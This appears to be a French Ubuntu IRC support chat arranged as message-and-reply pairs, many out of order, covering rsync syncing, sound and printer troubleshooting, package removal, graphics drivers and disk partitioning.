la connaissance ne vaut que si elle est partagée, Progz et du coup ça fonctionne sans le wildcard ?	oui nikel. Of course pour le wiki ^
L'option --delete qui permet d'avoir une synchro n'est pas compatible avec wildcard	Je ne comprends pas pourquoi tu parles de suppression en local, rsync s'intéresse à l'état du dossier local, pas la façon dont se sont passé les suppressions.
ah bein non clache faut pas, tu peux avoir des idées … mais personnellement je vois pas comment faire ça via rsync Progz	avec l'option --delete ^^ habituellement cela fonctionne.
ça overwrite	Moi,je maîtrise mal rsync,alors je ferme ma g... ;-)
sans moi alors :)	Au final oui. Il supprime les fichiers de la destination qui l'ont déjà été dans la source et push ceux qu'il restait.
Au final oui. Il supprime les fichiers de la destination qui l'ont déjà été dans la source et push ceux qu'il restait.	il écrase si il porte le même nom, nope ?
'fin j'espere pas sinon tu perds ton temps ^^	je souhaite que lorsque le rsync s'execute il supprime sur la destination si le fichier n'existe pas dans la source
et puis rsync marche dans les 2 sens.	bein tu cherches juste à supprimer un fichier ?
Les nouveaus fichiers sont bien copié mais ceux qui n'existent plus dans la source ne sont pas supprimé de la destination	Je me demande si en exprimant ton besoin par des mots en premier, ça aidera mieux à la correction de ta commande. :-)
Je me demande si en exprimant ton besoin par des mots en premier, ça aidera mieux à la correction de ta commande. :-)	Transférer d'un point A les fichiers dans B, si dans B il y'a des fichiers qui n'existe plus dans A alors on le supprime.
Transférer d'un point A les fichiers dans B, si dans B il y'a des fichiers qui n'existe plus dans A alors on le supprime.	En exécutant les commandes depuis B me semble-t-il.
En exécutant les commandes depuis B me semble-t-il.	impossible B n'a pas accès à A
impossible B n'a pas accès à A	Peut importe que rsync soit réversible, il faut être d'accord du lieu où elle est exécuté pour ne pas obtenir le résultat inverse de ce que tu souhaites.
oui, mais c'est le cas, ta commande synchronise un dossier X/tesfichiers vers un serveur distant dans un dossier X/tesfichiers il sync' les fichiers, je pense pas me tromper Progz, patiente pour avoir confirmation	tu aurais fait comment ?
rsync -av --delete --exclude=*.log /data/www/test.ac/* x.x.x.x:/data/www/dev.ac/ => beaver	ça te donne quoi comme erreur exactement ?
ça te donne quoi comme erreur exactement ?	aucune erreur la commande me sors bien un code retour 0
s	M'avais-tu lu quand j'ai dis "Je ne sais pas ce qui est possible avec /etc/hosts.deny , mais userContent.css te permet de bloquer ou modifier les éléments que tu souhaites."? C'était il y a quelques jours. :-)
elle est entière là	dans un script peut être, mais là ?
je re rsync et bim toujours là	ne tronque pas ta commande pour voir ?
c'est pas des bozons qui aurait pu causer ça ?	plu probablement des bozos
Qu'entends tu par pronoms? j'ai fais un fdisk -l , deux md***** à la base. Il restait que le grub. Même les lvms derrière partition raid système avait disparu	ça fait plus penser à un souci d'admin / autre qu'à un hack
(on me sort pas la france svp, vu ce qui vient de passer ;))	c'est pas vraiment le sujet (donc le bon endroit) ici
tu rigoles? t'as trouvé tout seul	oui mais dans le processus de recherche que tu as aidé à accomplir
tape dans un terminal alsamixer	AH merde j'ai trouvé ! J'explore les options du son et je change de alsa pulg in HDMI à analogique, et tadam
de muet ou untruc dans le genre	non pas de sourdine, je l'ai mit la sourdiné puis désactiver, y'a aucun problème. Mais quan dje lance le "gmusicbrownser" ça ne marche pas
tableau de bord, ajouter de nouveaux éléments	oui elle est noire, oui je le fais mais dans la liste y'a rien concernant le son, ou le sound
tu pourrais essayer d'ajouter l'applet son sur la tableau de bord?	ben justement je ne sais pas je la trouve pas dans la liste
moui je vois ca	que crois tu qu'il faille faire ? tu crois que j'ai pu mal insérer une prise ? pourtant j'ai vérifié
t'es au boulot?	non je suis chez mon grand père
et toujours pas de son la?	ah non toujours pas
ouais ouais on y crois, fai moi donc un sudo service pulseaudio status?	 status
le truc c'est que s'il ne veut pas démarrer c'est que la config doit etre incorrecte	ierre@pierre-System-Product-Name-System-Product-Name:~$ sudo service pulseaudio start
Bonjour	salut
lol donné? hum...	pulsaudio est en - !!
tu trouves?	pardon j'ai eu un mec qui a donné chez moi
tu utilise pulseaudio ou alsa?	je l'ignore :(
t'as fait des mises a jours? fait des modifs? t'as pas la sourdine des fois?	oui j'ai fait des mises à jour, celles proposées automatiquement par Xubuntu.  Des modifs oui j'en ai fait pour résoudre un autre problème. Sourdine ?
ca marchais hier soir?	oui
c'est un kit 5.1?	AH ! J'entends le son avec le blackberry branché !
bah, il en a une non ?	 oui
un truc qu'a pas de sortie jack, ça a pas dut marcher bien fort...	ah bon, pardon alors, je vais insérer le câble noir dedans alors
c'est quel modèle ton blackberry?	 derrière le PC il y a trois sorties audio : rouge vert et bleu. Je branche trois câbles de mes enceintes, un bleu et un vert, mai sje branche le noir sur le rouge. J'ai toujours fait ainsi.
ça fait souvent ça quand tu eteint des enceintes, tu as toujours un bruit	blackberry curve a 25 €
J'essaye de ressentir cette saveur	ah bon
ouais bon c'est juste pour être sur que ça vient pas de tes enceintes	je comprends oui. J'ai une petite intuition peux tu me dire si tu en partage la même saveur ? Hier soir j'ai éteint le PC j'ai entendu un "PET" sonore assez fort quand ça s'est éteint. Est il possible que ce PET ait endommagé un truc électrique dans les enceintes ?
et sur ton Blackberry t'as pas une sortie jack ?	non je ne vois pas de sortie
pour tester tes enceintes	je ne sais pas je vais regarder je crois qu'il y juste une entrée pour un casque + une entrée USB (et la batterie)
et un lecteur mp3? chaine hifi ou autre?	mais je n'ai aucun casqu eou périphérique extérieur
aie	quand je tripote les connecteurs derière le caisson de base j'entendes des crashement sonores, alors ça doit encore fonctionneent matriellement je crois
coffee` clache  bleurg	Regarde ce qui est dit là http://doc.ubuntu-fr.org/tutoriel/lorsque_le_systeme_gele#depuis_un_terminal_virtuel .
Coffe est blagueur. Mais Coffe ne dort plus depuis 1997... Il a cramé sa maison made in Ikea et depuis il joue au golf. :)	lol
C'est moi qui propose :-) et ça me ferait plaisir	C'est gentil, je te remercie.
les perspectives sont inouies	Je ne sais pas comment les autres le prendrait.
tout à fait Mickael , tu pourrais offrir une carte son à clache afin que vous échangiez de vive voix sur de nombreux sujets	Euh, non, on ne va pas faire ça. On est sur un salon de support.
alt F2/ killall?	Ce n'est pas toujours possible.
j ai peu etre pas comrpis mais ca sert a rien.	Je ne connais pas "system monitor".
"system monitor"? j suis sur 14.10 Gnome.	http://doc.ubuntu-fr.org/tutoriel/lorsque_le_systeme_gele + la page des touches magiques.
Y as un programme qui log / qui ne freez pas / qui permet de fermé un truc qui part en vrille?	Le Gestionnaire de tâches?
03|tsid:67590|cid:285697283|lid:89156749043|nw:g|crid:53440930763|rnd:17075006501169685229|dvc:c|adp:1o5	Ouais, ça devrait le faire; faudrait que je récupère un micro-casque puisque je ne pourrais pas utiliser ceux du portable.
Racheter une carte son ?	En interne, je ne suis pas sur que ça se vends en pièce détaché. Et une externe par prise usb, ça serait possible, mais voilà, je suis au rsa et n'arrive déjà pas à joindre les 2 bouts. :-/
T'aurais besoin de quoi exactement clache ?	Eux, bah là, j'ai un portable, c'est un vaio.
Kezako mumble?	http://doc.ubuntu-fr.org/mumble .
je reste sur le mumble si certains veulent discuter.	C'est une panne matériel, et je n'ai pas de nouveau ordinateur à l'horizon. ;-)
 contribution, l'un n'empeche pas l'autre, on peut faire les 2 selon les moments. là j'avais unpeu de temps  et ca reste plus sympa  de discuter de vive voix, on fait un peu mieux connaissance, on se connait mieux pour la suite...etc... y a pas mal de points positifs aussi à ça.	Je veux bien aller dans ton sens, mais c'est juste un cas d'espèce sur ce salon. Et pour ce qui me concerne, j'ai vraiment ma carte son qui ne marche pas, et ça me gène beaucoup puisque je téléphonais en voip et n'ai ni téléphone fixe, ni portable. Ce n'est pas en refus de te parler. ;-)
:-)	Sache qu'on est un salon de support, on n'aide qu'en public afin que quelqu'un ayant une meilleure réponse puisse la donner. Ca permet aussi d'avoir des astuces sur des questions que l'on ne s'était même pas posé. Enfin, ça permet d'éviter que quelqu'un fasse faire à un autre quelque chose de mauvais. Je ne sais pas trop quel est ton but, mais ça plaît moyennement.
.  TU voudrais bien venir par exempel clache ou n'importequi d'autre ?	Et effectivement, quand a eu besoin d'un mumble, on s'est servi de celui de l'april.
Ok et bien dans ce cas  si quelqu'un veut venir sur celui de l'APRIL (asso de promotion du logiciel libre) http://wiki.april.org/index.php?title=Mumble&action=edit il est libre et ouvert j'y suis (tout seul pour l'instant ...)   j'aimerai discuter de  2/3 trois trucs  rapidement à propos  d'ubuntu  vu que je viens tout juste d'installer aujourd'hui	Ma carte son est morte...
Bonsoir, y a t-il déjà un serveur mumble existant pour  la communauté ubuntu-fr ?	On ne fourni pas ce service.
une idee ?	Tout ce que j'ai, c'est http://doc.ubuntu-fr.org/unity_launcher .
je regarde ca.	Si tu t'en sort pas, tu demanderas http://doc.ubuntu-fr.org/imprimante .
Bonne idée	Cherche ton imprimante dans la doc.
Tout ce que j'ai pu faire est me mettre Administrateur.	Tu suis un tuto?
quelqu'un pour m'aider ??	ça me parait peu probable
merci avelldiroll, mais ça n'a rien à voir avec mon problème	C'est pourtant ce que tu as décris.
C'est pourtant ce que tu as décris.	ce n'est pas la luminosité qui est à 0, c'est le driver vidéo qui ne s'initialise pas
un peu de bg : je viens d'Irix et Solaris, puis un peu de Linux à la fin des années 90 (après quoi j'ai surtout bossé sous Windows donc j'ai pas trop cherché)	les cartes Intel GMA sont connues pour avoir un support atroce sous linux, regarde là: http://doc.ubuntu-fr.org/intel_graphics (y a le detail pour la GMA 4500)
les cartes Intel GMA sont connues pour avoir un support atroce sous linux, regarde là: http://doc.ubuntu-fr.org/intel_graphics (y a le detail pour la GMA 4500)	ils en disent plutôt du bien, des cg Intel... et je ne vois pas de problème particulier mis en lumière avec la 4500... O_o
ils en disent plutôt du bien, des cg Intel... et je ne vois pas de problème particulier mis en lumière avec la 4500... O_o	"les cartes intels" … à l'exception des GMA dont Intel a refusé de liberer les drivers (il me semble que c'est du au fait qu'elles soient sous traitées pas intel, pas dev en interne)
"les cartes intels" … à l'exception des GMA dont Intel a refusé de liberer les drivers (il me semble que c'est du au fait qu'elles soient sous traitées pas intel, pas dev en interne)	en tout cas si tu dis vrai, j'aurai le problème quelle que soit la distribution
en tout cas si tu dis vrai, j'aurai le problème quelle que soit la distribution	des specs que j'ai vu sur le net, le e6400 etait livré avec une gma 4500 … si c'est le cas, tu devrais relire la page, sur ce, bonne continuation
tu veux installer windows ou mac os?	Windows
les seules cartes intel sans drivers libres	d'après ton lien, ma CG (une "HD graphics") est justement une de celles faites par Intel même, et les drivers sont directement dans Xorg
J ai lu plus tot que vmware abandonnait les procs en 32, d ou la limitation a v7... ils en sont a v11 maintenant.	"old school"... sérieusement ? C'est un Core 2 Duo à 2.5 GHz avec 4 Go de RAM, je trouverais hallucinant qu'on ait plus de problème avec qu'avec :D Et les 3/4 des périphériques sont super standard (genre pas de lecteur d'empreintes obscurs ou quoi que ce soit du genre)
j ai un pc recent et intel a sorti des drivers tout neufs y as 10j, donc j ai pas eu de pb.	ha, oui... le mien date de 2008, donc la CG est bof bien supportée (genre c'est du MESA 2.1 je crois et y a plein de trucs qui marchent bof)
mon bg : 10 ans de mac os, 10j de linux	oui, j'ai regardé ça, mais apparemment pour la 14.04 il faut forcer l'installation de paquets plus récents ; ceux prévus pour elle sont les mêmes que dans les dépots de base
en fait j'en ai un peu ras-le-bol d'avoir à tweaker des choses pour que ça marche... j'ai l'impression de revenir dans les années 90, c'est pénible	ta CG intel,c'est une GMA ?
ta CG intel,c'est une GMA ?	une Mobile GMA 4500 HD, je crois
j'ai jamais eu plus de souci avec les touchpad sous linux que sous d'autres OS	ouaip, une...
pas encore	As-tu regardé http://doc.ubuntu-fr.org/dell_inspiron_6400 ?
lvm sur un SSD, c'est pas une bonne idée effectivement, mais bon, le snapshoting sur SSD, c'est globalement pas un truc à faire	Dans about:addons , auto refresh n'apparaît pas en faisant une recherche sur son nom... O_o
Dans about:addons , auto refresh n'apparaît pas en faisant une recherche sur son nom... O_o	dans les commentaires, ils disent que la compatibilité etait perdu pour certaines versions
dans les commentaires, ils disent que la compatibilité etait perdu pour certaines versions	Reloadevery refuse de se télécharger. Je retenterais plus tard, mais c'est une bonne idée avec ce nouveau sans carte son.
il reste des cas aux limites chez les gens qui entassent lvm et softraid	Je me suis fier à Fonctionne avec Firefox 3.0 et supérieures.
j ai l impression qu au bout d un certain il me fait rammer a mort.	j'utilise wallch, dont je suis satisfait
Je vais voir ça	https://addons.mozilla.org/fr/firefox/addon/reloadevery/  <- celui ci est mieux noté
cool, merci	les reviews de l'addon sont pas top, il y en a d'autres
dur de trouver l'extension qu'il me faut, visiblement	Regarde si morning coffee convient.
Je vais voir, merci	https://addons.mozilla.org/fr/firefox/addon/auto-refresh/
j ai essayer les plugins de firefox; rien a faire. j ai l impression que c est bridé.	c'est pas bridé, juste pas configuré
Quand meme bien foutu tout ca :)	fait toi un cron qui tourne toutes les heures et qui te colles get-selections dans un fichier
fait toi un cron qui tourne toutes les heures et qui te colles get-selections dans un fichier	j aimerais utiliser le scroll lateral dans firefox pour avancer / reculer d une page. Bizarrement firefox reconnait le scroll lateral mais pas la fonction page avant/arriere.
j aimerais utiliser le scroll lateral dans firefox pour avancer / reculer d une page. Bizarrement firefox reconnait le scroll lateral mais pas la fonction page avant/arriere.	je suis pas sur de voir de quoi tu parles, mais les gestures, ca depend du DE, et il me semble que par défaut il n'y a que le scroll haut/bas sur le coté droit du pad qui est activé
Au fait j ai reussi a installer mac sous virtualbox en utilisant les memes astuces que sur PC pour qui chercherait.	Alt+flèches gauche et droite.
ah cool	y a des addons pour firefox ou chromium, sinon watch + curl
Un F5 automatique devrait marcher	Il y a des extensions pour firefox qui doivent faire ça.
lvm tu peux plus multiboot si?	à l'epoque de grub1, il etait conseillé de conserver un /boot hors lvm, depuis grub2, y a plus ce probleme
à l'epoque de grub1, il etait conseillé de conserver un /boot hors lvm, depuis grub2, y a plus ce probleme	en fait je vais juste uploader quelquepart mon fichier de pkg et basta
nan mais c est parfait ca, si je doit reinstaller ca sera vite fais, les datas sont ailleurs.	http://askubuntu.com/questions/470632/install-lvm-dual-boot-with-windows
merci!	si tu peux
pas mal le dpkg ... et y a un moyen de tout retelecharger d un coup au besoin?	pourquoi donc ?
Je dois en etre a ma 15eme reinstalle de linux en 15j ehe.. mais je commence a etre content de mon systeme.	regarde ces deux liens
Je veux dire : retour aux besoins	il a demander une solution simple pour snapshoter, lvm est une solution simple pour snapshoter
Peter tu m'as bien renseigné à propos de trucs comme ça.  Mais avell cherche-t-il qqchose plus simple?	merci de ne pas ecorcher mon nick, utilise la touche tab pour l'autocompleter si tu le trouves trop long … de plus ne pas utiliser le nick exact n'HL pas
En parlant de backup... ca existe un programme pas trop complique pour faire un 'snapshot' du system; sans qu il fasse un bete copie coller de tout?	data != configuration
ce'st qu'elle n'est physiquement pas présente	avec lvm c'est possible comme approche, faire le snapshot ne co6ute pas en temps, c'est la reinitialisation dans l'etat du snapshot qui peut mettre du temps à se deployer
yep	d'où mes guillemets
si lsusb ne voit pas ton imprimante	c'est juste une liste de paquet installés reutilisable pour les installer en une commande, la notion de snapshot couvre un chouilla plus de choses :)
mezen : merci	jsutement
Super c etait bien l overlay merci bcp!	http://doc.ubuntu-fr.org/tutoriel/comment_sauver_et_restaurer_la_liste_des_paquets
lvm?	lvm
j avais un bug de font avant... mon pc est recent donc pas trop au point j ai l impression	lvm
merci je regarde, le resultat c est ca http://uprapide.com/image/957830-screenshot-from-2015-04-15-22-49-43	dpkg --get-selections
avec Intel Graphic Installer for Linux... je l ai laisser faire.	tu peux simplement faire un listing des paquets installés
Personne n as une idee pour resoudre l affichage de vlc? En fenetre j ai des pixels rose et vert et en plein ecrant ca ressemble a une video super pixelisé, sans anti anliasing.	Si.  Mais je le connais peu.  "Sauvegardes"
wep	depuis le début je l'avais senti le coup de l'usb hs
il me dit l'avoir fait	chapeau pour le sens de l'intuition
;)	tu vois .. cas du /home là
**hardware**	 attend j'ai oublié d'appliquer les trucs qu'on a fait sur synatpic tout à l'heure, quel idiot c'est peut être ça. Je le fai set je rente
 attend j'ai oublié d'appliquer les trucs qu'on a fait sur synatpic tout à l'heure, quel idiot c'est peut être ça. Je le fai set je rente	rien à voir
rien à voir	 merci beaucoup !
bonsoir, j ai installé les derniers drivers intel graphics, ce qui m as resolu un problemes de fonts... mais maintenant j ai un probleme avec VLC, jai des carrés de pixels rose et vert un peu partout dans la video... quelqu un a eu ce probleme?	sinon, dans les paramètres vidéo de vlc, tu peux jouer avec "Sortie", regarde ce qui va mieux pour toi.
oui je test ça bonne idée	welcome :)
donc …	 OH MY GOD : http://pastebin.fr/39316 et ça détecte automatiquement que c'est une brother HL 2130 !!!
je vais changer de port USB alors	as tu un autre câble usb ?
!help	 c'est bizzare on voit pas mon imprimante !
 c'est bizzare on voit pas mon imprimante !	oui donc lsusb pas d'imprimante ?
oui donc lsusb pas d'imprimante ?	en effet j'ai refait le lsusb et l'imprimante n'apparait toujours pas. Pourtant j'ai bien changé de port l'USB est désormai sdirecrtement branché en port Frontex (non, frontal plutot).
McPeter, cette commande donne ça : http://pastebin.fr/39316	je penche à croire que ton problème d'imprimante est simplement une blague
je penche à croire que ton problème d'imprimante est simplement une blague	mais non ce n'est pas une blague, hélas
changer de port usb	déjà proposé
yep, faire du support en doutant des infos données, ca donne pas envie :/	parles tu à propos de ma blague ?
!paste	(help [<plugin>] [<command>]) -- This command gives a useful description of what <command> does. <plugin> is only necessary if the command is in more than one plugin. You may also want to use the 'list' command to list all available plugins and commands.
:)	ca en fait un :p
"Welcome in IsIS. Amdullah" <- j'ai vu ça quelque part mais je me rappelle plus où, ah peut etre sur le site de tv5 monde	?
?	oui :)
oui :)	quel rapport avec du support concernent ubuntu?
quel rapport avec du support concernent ubuntu?	<pierre_> localhost:631 ça donne une page bizzare "Welcome in IsIS. Amdullah". Normal ?
<pierre_> localhost:631 ça donne une page bizzare "Welcome in IsIS. Amdullah". Normal ?	ah pardon, je n'avais pas relevé
le nom devant le "@"	 j'essai le HP Printer (HPLIP) ?
 j'essai le HP Printer (HPLIP) ?	mmh … ouvre un terminal
Je vois dans la liste des imprimantes locales : HP PRinter, Serial Port 1 et HP Fax (HP ça veut dire quoi ?)	mmh … ouvre un terminal
ton user/pass	 ah non c'et bon ça marche j'avais fait une faute
normal	je pensais que mon utilisateur c'était "pierre" mais on dirai pas 'le mot de passe j'en suis sûr).
tu as quoi comme choix ?	 je peux aussi ajouter une classe, gérer les imprimantes (y'en a aucune d'installer), ou gérer les tâches (aucune en attente)
cliques sur "Ajouter une imprimante"	j'ai Ajouter une imprimante mais faut que je tappe un utilisateur et un mot de passe
mmh	y'a un autre truc bizzare que j'ai pas dit : tout à l'heure j'ai essayé de supprime rl'imprimante puis en ajouter une d'un autre modèle, genre le modyle 2030 (moi c'est 2130). Et ça me disait que mon imprimante était connectée (alors qu'avec  2130  il écrit "unplugged or turned  off"
ah, d'accord	Je disais: fais ce qu'il te dis de faire, suis le.;-)
enfin, proposé	Le /var/log/apt/hitory.log va te dire ce que tu viens de désinstaller.
Le /var/log/apt/hitory.log va te dire ce que tu viens de désinstaller.	merci mais qu'es ce que ça change de savoir ce que je viens de désinstaller en 'loccurence ?
merci mais qu'es ce que ça change de savoir ce que je viens de désinstaller en 'loccurence ?	La question a été posé, mais suis McPeter.
mmh .. attends .	j'y suis dans local host
j'y suis dans local host	?
via synatic	oui c'est fait pour le paquet printer driver ptouch, ainsi que le paquet bbdb comme m'a conseillé de le faire mezen
oui c'est fait pour le paquet printer driver ptouch, ainsi que le paquet bbdb comme m'a conseillé de le faire mezen	bon à présent va dans ton navigateur internet
bon à présent va dans ton navigateur internet	je viens de relancer l'imprimante, l'utilitaire d'installation je veux dire. Cette fois je n'ai même plus le LPT1 qui apparait, il n'y a que port série.
mais tu me l'a demandé non ?	reinstalle le paquet printer-driver-ptouch
reinstalle le paquet printer-driver-ptouch	non mon USB n'est pas HS j'ai essayé de brancher l'imprimante via le port frontal ça ne change rien. Directement, sans le HUB je veux dire. A moins que l'USB de mon imprimant esoit mort mais ça me semble improbable, je suis confronté au même problème qu'avant la désintallation, je pense que le problème est informatique pas matériel.
non mon USB n'est pas HS j'ai essayé de brancher l'imprimante via le port frontal ça ne change rien. Directement, sans le HUB je veux dire. A moins que l'USB de mon imprimant esoit mort mais ça me semble improbable, je suis confronté au même problème qu'avant la désintallation, je pense que le problème est informatique pas matériel.	ça me paraît bizarre quand même
oui ça : pierre@pierre-System-Product-Name-System-Product-Name:~$ sudo apt-get remove ii  printer-driver-ptouch                       1.3-8	Tu as les noms des paquets dans tes logs.
Pouvez-vous m'aider ? Je suis prêt à payer, j'ai beaucoup d'argent.<- je suis intéressé pierre_	 lol
 lol	fais comme ça  dans synaptic: http://pasteboard.co/2AJjwOew.png
fais comme ça  dans synaptic: http://pasteboard.co/2AJjwOew.png	merci, j'ai essayé ce que tu m'as dit, mais je n'ai retrouvé que deux parques sur les 5 du csreen : bbdb et printer driver ptouch. Le autres n'appaaissent pas dans la liste "brother"...
tu ne trouveras jamais ton imprimante sur LPT1 ou Port Serie hein	que dois je faire là ?
que dois je faire là ?	tu as installés  /désisntallé des trucs là du coup ?
tu as installés  /désisntallé des trucs là du coup ?	non, quand j'ai tappé brother aucun paquet n'était installé
non, quand j'ai tappé brother aucun paquet n'était installé	fais le via synaptic
en port série je serait très surprit	mon imprimante est branché sur un hub carré USB, sur lequel il y a aussi le scanner (qui d'ailleurs n'a jamais fonctionné sous ubuntu il a fallu que je prenne Vuescan, mais ceci est une autre histoire).
mon imprimante est branché sur un hub carré USB, sur lequel il y a aussi le scanner (qui d'ailleurs n'a jamais fonctionné sous ubuntu il a fallu que je prenne Vuescan, mais ceci est une autre histoire).	ah ben USB
*avec	chez des clients qui ont des vielles machines matricielles pour du listing
chez des clients qui ont des vielles machines matricielles pour du listing	useless use of electricity :p
y a des ordis vec des ports paralleles qui sont allumés en 2015 ?	oui oui :)
Mon grand père utilise cet ordinnateur, il m'assur en'avoir rien fait pour supprimer des fichiers, ou changer un truc ave cl'imprimante. Je le crois, il ne l'aurai pas fait, il est bien plus mauvais que moi encore ^^.	t'as bien selectionné "Catégories" et "Toutes" dans le volet de gauche ?
j'ai installé synatpic McPeter, maintenant il faut que je passe par synatpic pour supprimer tous les fichiers brother c'est ça ?	Une fois que tu seras dans synaptic, tu sélectionnes un paquet et fait Clic droit/Sélectionner pour suppression complète. Ca vire les fichiers de configuration en même temps.
Une fois que tu seras dans synaptic, tu sélectionnes un paquet et fait Clic droit/Sélectionner pour suppression complète. Ca vire les fichiers de configuration en même temps.	oui exactement
merci	dans synaptic, tu cherches le ou les paquets et tu fais "Sélectionner pour suppression complète"
dans synaptic, tu cherches le ou les paquets et tu fais "Sélectionner pour suppression complète"	 je n'ai aucun fichier, aucun paquet correspondant à brother, qui ne soit installé
plutôt que "bricoler" dans le système là	oui j'ai tenté, je l'ai écrait dans le second message du topic : http://forum.ubuntu-fr.org/viewtopic.php?pid=19625831#p19625831
oui j'ai tenté, je l'ai écrait dans le second message du topic : http://forum.ubuntu-fr.org/viewtopic.php?pid=19625831#p19625831	c'est une imprimante réseau ?
tu risques de faire plus de dégât qu'autre chose là	Et à l'origine, ça lui avait fait la même chose avec ubuntu. Coincé, il est passé à xubuntu.
d'accord je le fais mais à part ça, le gars alca94 dit qu'il faut suprimer tout fichier brother dans le système mais je ne sais pas comment rechercher ça dans le disque dur	dans le champ de recherche en haut tape brother et voit ce que ça te sort
dans le champ de recherche en haut tape brother et voit ce que ça te sort	et bien écoute sc'est incompréhenseible : j'ai réinstaller Xubuntu à la place d'ubuntu et elle était immédiatement reconnue. Mais depuis une semaine sans raison apparente, elle ne l'est plus. On dirai un bug "aléatoire".
et bien écoute sc'est incompréhenseible : j'ai réinstaller Xubuntu à la place d'ubuntu et elle était immédiatement reconnue. Mais depuis une semaine sans raison apparente, elle ne l'est plus. On dirai un bug "aléatoire".	tu as tenté de "simplement" _virer_ l'imprimante
OK McPeter	accessoirement (je n'ai pas lu l'ensemble de la discussion du forum) .. mais je vois les dates : 2013  .. ton imprimante n'est pas reconnu nativement ?
je ne me sers que du terminal	il compte en cobol
ça doit faire 6ans que je me suis pas servit de synaptic ... tellement plus rapide en terminal	ça montre que t'es vieux ^^
ok, la seconde commande n'a rien changé alors	Synaptic n'est pas installé par défaut ,il faut le faire.
Synaptic n'est pas installé par défaut ,il faut le faire.	 je l'installe
t'auras accès à tout "ça" rapidement et simplement ^^	ok je fais ça
je réinstalle alors ?	je te conseille de suivre les indications de YvesLevier si tu ne maitrises pas la ligne de commande
je te conseille de suivre les indications de YvesLevier si tu ne maitrises pas la ligne de commande	 moi j'ai rien de tout ça : Système adminisraiton etc. J'ai Xubunutu c'est peut être pour ça
 moi j'ai rien de tout ça : Système adminisraiton etc. J'ai Xubunutu c'est peut être pour ça	passe par la logithèque
ah	je susi aussi sous xubuntu
E: Impossible de trouver le paquet amd64	fallait pas tout taper
Lecture des informations d'état... Fait	argl
tu lags mon ami ;o)	la première comande de désintaller a foncitonné mais la seconde donne un résultat anormal , par exemple :Construction de l'arbre des dépendances
3 jours plus tard ᴖ_ᴖ	J'ai trop de lag réseau...
22:05:14      pierre_ | McPeter,  ok merci ! Dommage que y'ait pas d'interface graphique      <===== Tu peux le faire avec synaptic en graphique.	hahaha
Si ça marche pas alors Peter va te donne ta ligne de commande	oui, en fait
ah ! pardon merci YvesLevier   je n'avais pas compris que tu t'adressais à moi	:)
...	viens de te l'indiquer
alga94, du forum, dit ici : http://forum.ubuntu-fr.org/viewtopic.php?pid=14775581#p14775581 qu'il faut faire la commande dpkg -l | grep -i brother   puis ensuite désinstaller les fichiers listés, or je ne sais pas comment désinstaller de sfichiers.	apt-get remove <nomdupaquet>
apt-get remove <nomdupaquet>	 ok merci ! Dommage que y'ait pas d'interface graphique
 ok merci ! Dommage que y'ait pas d'interface graphique	y'en a !
...	vue qu'il utilise dpkg il est en terminal
par exemple j'ai deux fichiers on dirai : ii  printer-driver-ptouch                       1.3-8                                amd64        printer driver Brother P-touch label printers	ah !! :)
Bonsoir. Comment on désinstaller les fichiers qui apparaissent après un "dpkg -l | grep -i brother" ?	heu pas compris ?
Mais, on dev pas sur le serveur de prod de toute façon. x)	je parlais de local
Ah ouais, ok, c'est juste le temps de reconstruction ok! On perd rien donc. :)	encore heureux
Mais juste, "perdre la base de données musicale", il perdrait quoi en fait ? Même si le lecteur gère ça avec MySQL, y'a les balises ID3 qui restent, donc osef non ? Il peut les retrouver ensuite tout seul Amarok.	tu imagines le temps de reconstruction de la bdd ?
o_O ?	ça n'existe pas un ~/.local/mysql ?
ça n'existe pas un ~/.local/mysql ?	en tout cas Amarok n'en créé pas
il te faut un couteau bien aiguisé clache	heu .. pas que je sache
Je vois un peu	donc dans ce cas de mysql
Salut	Toujours là?
Sérieusement, avec 2 *buntu installées, je peux faire pointer les 2 /home/clache/Videos sur la même partition. Suffit de ne pas cocher formater quand j'installe le second. Et les 2 systèmes n'y verront rien.	ben oui :)
(on dérive là)	J'ai toujours des problèmes d'espace disque.  Merci de m'instruire.
J'ai toujours des problèmes d'espace disque.  Merci de m'instruire.	par exemple le cas typique où déplacer des dossiers de / pourrait avoir un intérêt pour l'utilisateur lambda (à moitié lambda) : une (très) grosse bibliothèque musicale … un choix de lecteur style Amarok
Qui veut une bière?	Pour trinquer, on peut choisir un autre canal.  T'as une question?
Tiens, je vais jouer à découper mon disque dur de 320Gio en petits morceaux. Il est en gpt, les partitions sont illimitées. :-)	tu veux forker Microsoft® ? ᒃ‿ᒄ
jamais essayé	C'est jeudi en 8.
LTS?	pour l'utilisateur lambda tout mettre sur UNE partition permet de simplifier les choses
Je suis un puriste alors...	on peut être puriste et efficace :)
on peut être puriste et efficace :)	C'pour ça que j'écoute
celui d'ubuntu, il a 39 secteurs	moi j'ai 4 disques dans ma tour ... (et aucun windows ᴖ_ᴖ )
donc le disque s'use	?
en général je sépare le /home du système	si ce n'est d'être sur de ton coup quand à l'espace alloué à /
bah un peu quand meme McPeter	ça n'apporte rien
comme ça j'ai toutes les permissions	pour l'utilisateur lambda aucun intérêt
mais j'écoute	ça n'a plus d'utilité réelle en desktop aujourd'hui
21:25:45        mezen | il parle de la date d'hier   <==== C'est le festival de l'humour ce soir... :-D	hah, c'est parce que j'ai pas compris sa question
21:25:17      McPeter | j'ai pas compris la question de YvesLevier ?                                                                                                                                                                                │ claime	ᓐ‿ᓒ
;)	les dépendances de quoi ?
s/sique/disque	non bah non, j'archive l'ancien dans un /home/old et je crée le meme profile
non bah non, j'archive l'ancien dans un /home/old et je crée le meme profile	oui tu peux aussi faire ça
perso, je préfère avoir un environnement neuf dans mon /home/user, des fois ce n'est pas compatible ou ça cause des erreurs au niveau de lightdm et compiz	ben  tu créés un nouveau profil à l'install :)
quasi chaque dossier de / était dans une partition spécifique	Je sais qu'il y a plus de dossiers, c'est juste que le menu déroulant d'ubiquity propose 8 choix. Tu fais quoi pendant que tu installes? Tu dors? :-D
Moi, j'essaierais pas de tricher en déplaçant des dossiers comme on fait en Winchose.	depuis que linux existe c'était justemnt la base d'une installation
Ça marche pas?	gni ? o_O tricher ?!
je répond mais je n'arrive pas encore à comprendre la question	j'ai déjà fait une réinstall "par dessus" avec mon ~/Vidéos sur une autre partition
j'ai déjà fait une réinstall "par dessus" avec mon ~/Vidéos sur une autre partition	oui, je sais, ubiquity le mentionne bien
et???	heu ? tu choisis quoi toi  ?
C'est la raison de ma demande à propos de la version	avec une mise à niveau oui, mais peut etre pas en réinstallant
en réinstallant?	on parlait de la possibilité de déplacer les différents répertoires (ex : /home /var /etc....) au moment d el'installation
M'excuse	Idem,je n'ai pas compris.
Rofl, même. :-D	14.04?
